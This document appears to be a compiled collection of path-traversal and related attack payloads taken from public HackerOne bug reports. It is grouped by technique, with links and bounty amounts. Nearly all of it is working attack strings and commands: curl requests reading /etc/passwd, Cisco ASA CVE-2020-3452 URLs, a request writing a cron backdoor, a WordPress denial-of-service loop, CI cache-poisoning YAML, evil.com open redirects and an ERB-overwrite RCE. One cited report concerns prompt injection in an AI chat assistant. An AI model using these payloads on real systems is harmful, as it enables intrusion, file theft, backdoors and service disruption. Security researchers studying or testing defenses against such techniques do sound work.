— [RCE as Admin defeats WordPress hardening and file permissions](https://hackerone.com/reports/436928) · WordPress · [simonscannell](https://hackerone.com/simonscannell)


## Path traversal via Android intent URL containing '../../' to escape the admin path

### `6f9261aa`

```
adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t "text/plain" -a "android.intent.action.SEND" --es "android.intent.extra.TEXT" "Arbitrary contents here" --es "android.intent.extra.TITLE" "../shared_prefs/test"
```

**Parameter:** `android.intent.extra.TITLE`
— [GitHub Security Lab (GHSL) Vulnerability Report: Insufficient path validation in ReceiveExternalFilesActivity.java (GHSL-2022-060)](https://hackerone.com/reports/1650270) · ownCloud · [atorralba](https://hackerone.com/atorralba) · $50.0

### `42ad5491`

```
am start -W -a android.intent.action.VIEW -d "https://target.com/admin/collections/../../
```

**Parameter:** `d`
— [Improper deep link validation ](https://hackerone.com/reports/1087744) · Shopify · [fr4via](https://hackerone.com/fr4via)


## Path traversal via CI cache key "../1/cache"

### `0c236890`

```
a:
  script:
  - ls -lashR
  cache:
    key: ../1/cache
    policy: pull
    paths:
      - .
```

**Parameter:** `key`
— [GitLab CI runner can read and poison cache of all other projects](https://hackerone.com/reports/301432) · GitLab · [jobert](https://hackerone.com/jobert) · $2,000.0

### `0f41a4a5`

```
a:
  script:
  - echo 1 > file-to-poison
  cache:
    key: ../1/cache
    policy: push
    paths:
      - file-to-poison
```

**Parameter:** `key`
— [GitLab CI runner can read and poison cache of all other projects](https://hackerone.com/reports/301432) · GitLab · [jobert](https://hackerone.com/jobert) · $2,000.0


## Path traversal via crafted protobuf descriptor name '../out_pwn/evil.proto'

### `25394cb9`

```
name = b'../out_pwn/evil.proto'
with open('/tmp/evil.bin', 'wb') as f:
    f.write(bytes([0x0a, len(name)]) + name + b'\x00')
```

— [Path Traversal in writeFile via Unsafe Prefix Containment Check Allows Out-of-Directory Writes](https://hackerone.com/reports/3634571) · arkadiyt-projects · [tipsen](https://hackerone.com/tipsen)

### `7d716a81`

```
TIPSEN:~:% python
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> name = b'../out_pwn/evil.proto'
... with open('/tmp/evil.bin', 'wb') as f:
...     f.write(bytes([0x0a, len(name)]) + name + b'\x00')
...
24
>>> exit
TIPSEN:~:% mkdir -p /tmp/out /tmp/out_pwn
TIPSEN:~:% ls /tmp/out
TIPSEN:~:% ls /tmp/out_pwn
TIPSEN:~:% /tmp/protodump -file /tmp/evil.bin -output /tmp/out
Wrote /tmp/out_pwn/evil.proto
TIPSEN
```

— [Path Traversal in writeFile via Unsafe Prefix Containment Check Allows Out-of-Directory Writes](https://hackerone.com/reports/3634571) · arkadiyt-projects · [tipsen](https://hackerone.com/tipsen)


## Path traversal via invitation_token parameter containing "../../"

### `13feb5e1`

```
https://target.com/users/confirmation?confirmation_token=z2-aaa&invitation_token=/../../test
```

**Parameter:** `invitation_token`
— [Path traversal leading to limited CSRF on GET requests on two endpoints](https://hackerone.com/reports/301862) · HackerOne · [kapytein](https://hackerone.com/kapytein)

### `4a7711b1`

```
https://target.com/users/password/new?invitation_token=/../../test
```

**Parameter:** `invitation_token`
— [Path traversal leading to limited CSRF on GET requests on two endpoints](https://hackerone.com/reports/301862) · HackerOne · [kapytein](https://hackerone.com/kapytein)


## Path traversal to read /etc/passwd via URL path

### `7060381e`

```
curl --path-as-is --url "localhost:10000/../../../../etc/passwd"
```

— [\[static-server-gx\] Path Traversal allowing to read any files on the server](https://hackerone.com/reports/581939) · Node.js third-party modules · [lightangel1412](https://hackerone.com/lightangel1412)

### `e02f7538`

```
curl -i -k --path-as-is https://██████████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
```

— [Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://████](https://hackerone.com/reports/695005) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)


## Path traversal using '../../' in value parameter to reach internal endpoint

### `1333560a`

```
{"type":"form-update","element":"#algo-id","value":"/../../../../../users/user?prefs%5Bsend_login_detected_email%5D=false","clientId":"x","roomId":"5ce6e50b298f7c6e0acb68c6"}
```

**Parameter:** `value`
— [Ability to perform various POST requests on target.com as a different user - insecure by design.](https://hackerone.com/reports/837328) · Quantopian · [irisrumtub](https://hackerone.com/irisrumtub) · $1,050.0

### `640c9115`

```
{"type":"form-update","element":"#algo-id","value":"/../../../../../users/user?firstname=h1&lastname=test&bio=hi#","clientId":"x","roomId":"5ce6e50b298f7c6e0acb68c6"}
```

**Parameter:** `value`
— [Ability to perform various POST requests on target.com as a different user - insecure by design.](https://hackerone.com/reports/837328) · Quantopian · [irisrumtub](https://hackerone.com/irisrumtub) · $1,050.0


## SQL injection with UNION SELECT to inject a path‑traversal payload for SSRF

### `ffad33e4`

```
https://target.com/r3c0n_server_4fdk59/album?hash=123%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/x%27--+%22,%22456%22,%22789%22--+
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `3b3b0383`

```
https://target.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api%27--%20-%22,1,2--%20-
```

**Parameter:** `hash`
— [H1 Hackyholidays CTF - The Grinch was defeated](https://hackerone.com/reports/1069467) · h1-ctf · [val_brux](https://hackerone.com/val_brux)


## Arbitrary file read using a file:// URL to access a local Windows INI file

### `2c1f1dd3`

```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost/windows/win.ini"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    92  100    92    0     0  46000      0 --:--:-- --:--:-- --:--:-- 46000
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1


fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.
```

— [SMB access smuggling via FILE URL on Windows](https://hackerone.com/reports/726117) · curl · [fms](https://hackerone.com/fms)


## Arbitrary file read via Kroki plantuml include directive pointing to /etc/passwd

### `b3cf7708`

```
[#goals]

[plantuml, test="{counter:kroki-plantuml-include:/etc/passwd}", format="png"]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- {counter:kroki-plantuml-include}
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
....
```

— [Kroki Arbitrary File Read/Write ](https://hackerone.com/reports/1098793) · GitLab · [ledz1996](https://hackerone.com/ledz1996)


## Command injection creating symlink to /etc/passwd for path traversal

### `a9ca77c6`

```
- rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
```

— [Worker container escape lead to arbitrary file reading in host machine](https://hackerone.com/reports/694181) · Semmle · [testanull](https://hackerone.com/testanull) · $2,000.0


## Command injection via URL query to windmail.exe to read arbitrary file

### `3341005e`

```
WINDMAIL.EXE?%20-n%20c:\boot.ini%20Hacker@hax0r.com%20|%20dir%20c:\\
```

**Parameter:** `url`
— [cgi scripts wordlist entry for windmail.exe has payload that sends arbitrary file read result to third-party](https://hackerone.com/reports/2733994) · PortSwigger Web Security · [floyd](https://hackerone.com/floyd) · $200.0


## Directory traversal using an absolute path //etc/passwd in a URL to read /etc/passwd

### `7bd47c9d`

```
$ curl --path-as-is 'http://127.0.0.1:6060//etc/passwd'

##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
...
```

— [\[angular-http-server\] Server Directory Traversal](https://hackerone.com/reports/330349) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)


## Directory traversal using ../ to escape /tmp directory

### `604f8c66`

```
/tmp/../etc/passwd
```

— [Path traversal by monkey-patching Buffer internals](https://hackerone.com/reports/2434811) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $2,430.0


## Directory traversal using '..' in file path

### `e0aa6d78`

```
const fs = module.require('fs')
fs.writeFileSync("/home/user/restricted/../secret.txt", "Target Overwritten!")
```

— [Filesystem experimental permissions policy does not handle path traversal cases.](https://hackerone.com/reports/1952978) · Node.js · [haxatron1](https://hackerone.com/haxatron1)


## Directory traversal via filePathDownload query parameter using ../../ sequences

### `4149095a`

```
https://███.mil/download.php?filePathDownload=data_products/MISC/frida_cal/../../../../../../../../etc/passwd
```

**Parameter:** `filePathDownload`
— [Local File Inclusion in download.php](https://hackerone.com/reports/1639364) · U.S. Dept Of Defense · [tokyoenigma](https://hackerone.com/tokyoenigma)


## Directory traversal via '..' in the lang parameter

### `f39ac821`

```
https://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../
```

**Parameter:** `lang`
— [Local File Disclosure /Delete On \[target.com\]](https://hackerone.com/reports/924407) · Acronis · [10nf](https://hackerone.com/10nf)


## Directory traversal using '..' in the 'lang' query parameter

### `4e54763b`

```
https://█████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `lang`
— [\[CVE-2020-3452\] Unauthenticated file read in Cisco ASA](https://hackerone.com/reports/1555015) · U.S. Dept Of Defense · [b4dc4t](https://hackerone.com/b4dc4t)


## Directory traversal using a malicious key in a nested JSON avatar object

### `9b8e8bfb`

```
{ "user": { "avatar": { "io": ..., "filename": "x.jpg", "key": "../../sensitive" } } }
```

**Parameter:** `avatar[key]`
— [ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection](https://hackerone.com/reports/3580511) · Ruby on Rails · [ksw9722](https://hackerone.com/ksw9722)


## Directory traversal via path parameter to write arbitrary file (cron backdoor)

### `69cbb6a9`

```
POST /api/v1/documents HTTP/1.1
Content-Type: application/json

{
  "file_data": "KiBldmlsIGNyb250YWIgZW50cnkK",
  "filename": "notes.txt",
  "content_type": "text/plain",
  "path": "../../../../etc/cron.d/backdoor"
}
```

**Parameter:** `path`
— [ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection](https://hackerone.com/reports/3580511) · Ruby on Rails · [ksw9722](https://hackerone.com/ksw9722)


## Directory traversal via the "path" query parameter

### `4eda065f`

```
https://target.com/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b
```

**Parameter:** `path`
— [CVE-2018-0296 Cisco ASA Denial of Service & Path Traversal vulnerable on \[target.com\]](https://hackerone.com/reports/2375666) · MTN Group · [deb0con](https://hackerone.com/deb0con)


## Directory traversal to read arbitrary files

### `3944a92c`

```
https://█████████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

— [https://████ is vulnerable to cve-2020-3452](https://hackerone.com/reports/998925) · U.S. Dept Of Defense · [moon_shadow](https://hackerone.com/moon_shadow)


## Directory traversal using ".." segments in the URL path

### `5dcaac8d`

```
.../user/../target-repo/pull/1
```

— [Prompt Injection via GitHub Patch in Brave AI Chat (Leo)](https://hackerone.com/reports/3086301) · Brave Software · [stellersjay](https://hackerone.com/stellersjay)


## Directory traversal using '../../' sequences in the 'filename' query parameter

### `57f0dda1`

```
https://target.com/5195267/reports/progress?filename=/../../../../../../../../../../sdcard/Download/disclosure.txt
```

**Parameter:** `filename`
— [Path traversal in deeplink query parameter can expose any user's private info to a public directory (one click)](https://hackerone.com/reports/2553411) · Basecamp · [fr4via](https://hackerone.com/fr4via)


## Directory traversal using ../../ sequences in HTTP request path

### `0e993328`

```
curl --path-as-is http://localhost:8181/../../file.txt
```

— [http-live-simulator npm module is prone to path traversal attacks](https://hackerone.com/reports/384939) · Node.js third-party modules · [lirantal](https://hackerone.com/lirantal)


## Directory traversal using '../../' sequences in the 'plugin' POST parameter to access arbitrary files

### `0584761d`

```
#!/bin/bash
target="http://<target>"
username="subscriber"
password="password"
cookiejar=$(mktemp)
   
# login
curl --cookie-jar "$cookiejar" \
   --data "log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" \
   "$target/wp-login.php" \
   >/dev/null 2>&1
   
# exhaust apache
for i in `seq 1 1000`
   do
      curl --cookie "$cookiejar" \
      --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" \
      "$target/wp-admin/admin-ajax.php" \
      >/d
```

**Parameter:** `plugin`
— [WordPress Authentication Denial of Service](https://hackerone.com/reports/163307) · Instacart · [clizsec](https://hackerone.com/clizsec) · $100.0


## Directory traversal using ../../ sequences to read /etc/passwd

### `2f3b7360`

```
$ curl --path-as-is localhost:1337/../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/usr/bin/nologin
daemon:x:2:2:daemon:/:/usr/bin/nologin
...
```

— [\[ponse\] Path traversal in ponse module allows to read any file on server](https://hackerone.com/reports/383112) · Node.js third-party modules · [szkrstf](https://hackerone.com/szkrstf)


## Directory traversal via ../../.. sequences in URL to read arbitrary files

### `0be76140`

```
curl --path-as-is https://grafana-303ca6f8-█████████.target.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
```

— [Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read](https://hackerone.com/reports/1415820) · Aiven Ltd · [j0v](https://hackerone.com/j0v) · $1,000.0


## Directory traversal using '../../' sequences in 'x-urlpath' parameter

### `b36faebb`

```
█████?x-app=itsm&x-urlpath=../../../../../../../../passwd
```

**Parameter:** `x-urlpath`
— [Admin panel take over | User info leakage | Mass Comprimise](https://hackerone.com/reports/428757) · U.S. Dept Of Defense · [bigchonk](https://hackerone.com/bigchonk)


## Directory traversal by supplying a malicious blob key via the avatar[key] parameter

### `15d1bb75`

```
POST /assets HTTP/1.1
Content-Type: multipart/form-data

avatar[filename]=photo.jpg
avatar[content_type]=image/jpeg
avatar[key]=../../../../../../tmp/malicious_payload
file=@payload.jpg
```

**Parameter:** `avatar[key]`
— [ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection](https://hackerone.com/reports/3580511) · Ruby on Rails · [ksw9722](https://hackerone.com/ksw9722)


## Directory traversal using a symbolic link (symlink) to escape the web root

### `26954fec`

```
$ ln -s ../../ symdir
```

— [List any file in the folder by using path traversal](https://hackerone.com/reports/403703) · Node.js third-party modules · [vulzzz](https://hackerone.com/vulzzz)


## Directory traversal using '../test.csv' to access arbitrary files

### `af2cf70d`

```
../test.csv
```

**Parameter:** `path`
— [Insufficient checks in the file path parameter allow writing to unauthorized directories](https://hackerone.com/reports/3384615) · SingleStore · [axolot23](https://hackerone.com/axolot23)


## Directory traversal using '..' in the textdomain parameter

### `d52313c7`

```
### Affected Endpoint for read files:

* https://target.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `textdomain`
— [Local File Disclosure /Delete On \[target.com\]](https://hackerone.com/reports/924407) · Acronis · [10nf](https://hackerone.com/10nf)


## Directory traversal using URL‑encoded '../' sequences in the request path

### `9752995e`

```
curl "http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

— [\[sirloin\] Web Server Directory Traversal via Crafted GET Request](https://hackerone.com/reports/790623) · Node.js third-party modules · [bp0lr](https://hackerone.com/bp0lr)


## Directory traversal to write arbitrary file via zip entry

### `ed08cf65`

```
../../../../../../../../../../tmp/poc_file
```

— [Wordpress unzip_file path traversal](https://hackerone.com/reports/205481) · WordPress · [ajxchapman](https://hackerone.com/ajxchapman)


## File path traversal to /etc/passwd via symlink

### `4ba618a5`

```
/etc/passwd
```

— [Worker container escape lead to arbitrary file reading in host machine](https://hackerone.com/reports/694181) · Semmle · [testanull](https://hackerone.com/testanull) · $2,000.0


## File URI with '../' traversal to access shared_prefs file

### `ae113368`

```
"file:///data/user/0/com.owncloud.android/cache/../shared_prefs/com.owncloud.android_preferences.xml"
```

— [GitHub Security Lab (GHSL) Vulnerability Report: Insufficient path validation in ReceiveExternalFilesActivity.java (GHSL-2022-060)](https://hackerone.com/reports/1650270) · ownCloud · [atorralba](https://hackerone.com/atorralba) · $50.0


## HTML script injection that loads a file:// URL to read /etc/passwd

### `02dc1aff`

```
# this is h1
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

— [\[markdown-pdf\] Local file reading](https://hackerone.com/reports/360727) · Node.js third-party modules · [n1__](https://hackerone.com/n1__)


## Local File Inclusion via directory traversal

### `36df7788`

```
../../../../../../../etc/passwd
```

**Parameter:** `template`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)


## Local File Inclusion via path traversal to read /etc/passwd

### `4894390c`

```
https://█████████/████████=/etc/passwd
```

— [lfi in filePathDownload parameter via ███████](https://hackerone.com/reports/1542734) · U.S. Dept Of Defense · [exploitmsf](https://hackerone.com/exploitmsf)


## Malicious gem injection via a file:// source to achieve code execution

### `6def154b`

```
victim$ gem fetch --clear-sources --source file:///home/user/trusted-gem-path minitest
victim$ tar -O -xf minitest-5.11.3.gem -- data.tar.gz | tar tzf -
lib/hacked.rb
```

— [DNS SRV lookup of file:// sources enables local hijacking of gems](https://hackerone.com/reports/411519) · RubyGems · [plover](https://hackerone.com/plover)


## Open‑redirect by crafting a `url` value with path‑traversal to the `/redirect` endpoint

### `2e7cf954`

```
{
   "url":"https:\/\/target.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/evil.com\/\/statements?month=01&year=2020",
   "data":"<html>\n<head><title>404 Not Found<\/title><\/head>\n<body>\n<center><h1>404 Not Found<\/h1><\/center>\n<hr><center>nginx\/1.15.8<\/center>\n<\/body>\n<\/html>"
}
```

**Parameter:** `url`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)


## Open redirect by injecting a malicious URL into the redirect_uri parameter using directory traversal (../../)

### `87bf6d6b`

```
https://target.com/oauth/authorize?client_id=...&scope=read,post&redirect_uri=https://evil.com/../../redirect_url=https://evil2.com/a.php%2Fcomplete
```

**Parameter:** `redirect_uri`
— [Broken Authentication (including Slack OAuth bugs)](https://hackerone.com/reports/2559) · Slack · [anandpingsafe](https://hackerone.com/anandpingsafe)


## Open‑redirect with path‑traversal to access the `/uploads` directory via the `url` parameter

### `8e2b1c95`

```
{"url":"https:\/\/target.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/evil.com\/uploads?\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

**Parameter:** `url`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)


## Open redirect by supplying a malicious URL in the url field of a JSON request

### `68d76cc0`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/evil.com\/uploads\/#\/\/statements?month=03&year=2020",
    "data": "<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><
```

**Parameter:** `url`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)


## Open redirect through path traversal in the URL field to reach a redirect endpoint

### `4366f0d0`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/evil.com\/#\/\/statements?month=03&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"style
```

**Parameter:** `url`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)


## Path‑traversal in API endpoint combined with open redirect using the `url` parameter

### `95ffce09`

```
https://target.com/api/accounts/../../redirect?url=https://evil.com/#/statements?month=03&year=2020
```

**Parameter:** `url`
— [\[H1-2006 2020\] CTF writeup](https://hackerone.com/reports/892632) · h1-ctf · [0xbeefed](https://hackerone.com/0xbeefed)


## Path traversal / arbitrary file read via crafted URL path

### `b9790f89`

```
http://127.0.0.1:8080/etc/passwd
```

— [\[md-fileserver\] Path Traversal](https://hackerone.com/reports/509697) · Node.js third-party modules · [johnssimon007](https://hackerone.com/johnssimon007)


## Path traversal using backslash‑escaped ".." sequences (%5c../) in the request path

### `b9366b3a`

```
GET /help/%5c../%5c../%5c../Gemfile
```

— [Directory traversal attack in view resolver](https://hackerone.com/reports/3370) · Ruby on Rails · [lautis](https://hackerone.com/lautis)


## Path traversal bypass by overriding path.resolve and reading /etc/passwd

### `f0da5cb0`

```
$ node --experimental-permission --allow-fs-read=/tmp/ -p "path.resolve = (s) => s; fs.readFileSync('/tmp/../etc/passwd')"
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f ... 3174 more bytes>
```

— [Permission model improperly protects against path traversal in Node.js 20](https://hackerone.com/reports/2225660) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $2,330.0


## Path traversal combined with open‑redirect by injecting `../` into the `url` field to reach the `/redirect` endpoint

### `2d005a79`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/evil.com\/&\/statements?month=01&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesh
```

**Parameter:** `url`
— [\[H1-2006 2020\] Multiple vulnerabilities allow to leak sensitive information ](https://hackerone.com/reports/895202) · h1-ctf · [zoczus](https://hackerone.com/zoczus)


## Path traversal via Cookie header token parameter containing '../+CSCOU+/csco_logo.gif'

### `cf3da9b8`

```
curl -k -H "Cookie: token=../+CSCOU+/csco_logo.gif"
```

**Parameter:** `token`
— [CVE-2020-3187 - Unauthenticated Arbitrary File Deletion](https://hackerone.com/reports/1555025) · U.S. Dept Of Defense · [b4dc4t](https://hackerone.com/b4dc4t)


## Path traversal using deep "../../../../../../../../etc/passwd" payload

### `4ff5dc8a`

```
../../../../../../../../etc/passwd
```

**Parameter:** `path`
— [Filename and directory enumeration](https://hackerone.com/reports/149273) · ExpressionEngine · [strukt](https://hackerone.com/strukt)


## Path traversal via directory traversal sequences in the request URL

### `a5ca22b6`

```
GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
Host: target.com
```

— [\[target.com\] Local File Reading](https://hackerone.com/reports/260420) · Ubiquiti Inc. · [bobrov](https://hackerone.com/bobrov)


## Path traversal using dot‑slash obfuscation to reach /etc/passwd

### `46266dac`

```
$ curl -v --path-as-is "http://IP:5432/..././..././..././..././..././..././..././..././..././..././etc/passwd"
root:x:0:0:root:/root:/usr/bin/fish
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

— [Bypass to defective fix of Path Traversal ](https://hackerone.com/reports/329837) · Node.js third-party modules · [caioluders](https://hackerone.com/caioluders)


## Path traversal via encoded ../ sequences in file URI

### `fe11d5cb`

```
file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml                                    /data/data/com.attacker/sdcard/prefs.xml
```

**Parameter:** `uri`
— [\[IRCCloud Android\] Theft of arbitrary files leading to token leakage](https://hackerone.com/reports/288955) · IRCCloud · [bagipro](https://hackerone.com/bagipro)


## Path traversal using ".." to escape directory restrictions

### `1a584a69`

```
$ node --experimental-permission \
        --allow-fs-read=/tmp/ \
        -p 'fs.readFileSync(new TextEncoder().encode("/tmp/../etc/passwd"))'
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 6e 6f 62 6f 64 79 3a 78 3a 36 35 35 33 34 3a 36 35 35 33 34 3a 4e ... 2103 more bytes>
```

— [Path traversal through path stored in Uint8Array in Node.js 20](https://hackerone.com/reports/2256167) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $3,495.0


## Path traversal using "///etc/hosts" payload

### `8f844813`

```
///etc/hosts
```

**Parameter:** `path`
— [Filename and directory enumeration](https://hackerone.com/reports/149273) · ExpressionEngine · [strukt](https://hackerone.com/strukt)


## Path traversal using "///etc/passwd" payload

### `0fc2c063`

```
///etc/passwd
```

**Parameter:** `path`
— [Filename and directory enumeration](https://hackerone.com/reports/149273) · ExpressionEngine · [strukt](https://hackerone.com/strukt)


## Path traversal with /exploit/ prefix to bypass restrictions

### `42c68f0e`

```
/exploit/etc/passwd
```

— [Path traversal by monkey-patching Buffer internals](https://hackerone.com/reports/2434811) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $2,430.0


## Path traversal via file URI supplied in android.intent.extra.STREAM extra

### `91e8d21f`

```
adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t "text/plain" -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "file:///data/user/0/com.owncloud.android.debug/cache/../shared_prefs/com.owncloud.android.debug_preferences.xml"
```

**Parameter:** `android.intent.extra.STREAM`
— [GitHub Security Lab (GHSL) Vulnerability Report: Insufficient path validation in ReceiveExternalFilesActivity.java (GHSL-2022-060)](https://hackerone.com/reports/1650270) · ownCloud · [atorralba](https://hackerone.com/atorralba) · $50.0


## Path traversal by including `../` sequences in a ZIP entry name to escape the intended directory

### `1abcec8c`

```
../../../../../../../data/data/jp.naver.line.android/files/something
```

— [Path traversal in ZIP extract routine on LINE Android](https://hackerone.com/reports/859469) · LY Corporation · [kanytu](https://hackerone.com/kanytu) · $475.0


## Path traversal via lang parameter using ../ to read files

### `4ffa6873`

```
https://██████████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `lang`
— [\[CVE-2020-3452\] Unauthenticated file read in Cisco ASA](https://hackerone.com/reports/1415825) · U.S. Dept Of Defense · [b4dc4t](https://hackerone.com/b4dc4t)


## Path traversal via '../' in lang query parameter

### `bf61cbd0`

```
https://████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `lang`
— [Path Traversal - \[ CVE-2020-3452 \]](https://hackerone.com/reports/1137321) · U.S. Dept Of Defense · [kmxx](https://hackerone.com/kmxx)


## Path traversal to load arbitrary script (../hack) via URL path

### `b1b7e70c`

```
curl --path-as-is 'http://localhost:8001/../hack'
```

— [\[larvitbase-www\] Unintended Require](https://hackerone.com/reports/579560) · Node.js third-party modules · [ermilov](https://hackerone.com/ermilov)


## Path traversal using markdown image URL to read /etc/passwd

### `e6246d42`

```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

— [Arbitrary file read via the UploadsRewriter when moving and issue](https://hackerone.com/reports/827052) · GitLab · [vakzz](https://hackerone.com/vakzz) · $20,000.0


## Path traversal via multiple ".." segments in a GitHub pull‑request URL

### `98538808`

```
https://target.com/brave/brave-browser/pull/../../../attacker/patch-poc/pull/1
```

— [Prompt Injection via GitHub Patch in Brave AI Chat (Leo)](https://hackerone.com/reports/3086301) · Brave Software · [stellersjay](https://hackerone.com/stellersjay)


## Path traversal using "../out_pwn/evil.proto" to escape the output directory

### `da51972f`

```
../out_pwn/evil.proto
```

— [Path Traversal in writeFile via Unsafe Prefix Containment Check Allows Out-of-Directory Writes](https://hackerone.com/reports/3634571) · arkadiyt-projects · [tipsen](https://hackerone.com/tipsen)


## Path traversal to overwrite an ERB template file, enabling server‑side template injection (RCE)

### `ac120a7e`

```
# overwrite erb
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text"
name: <% `touch me` %>

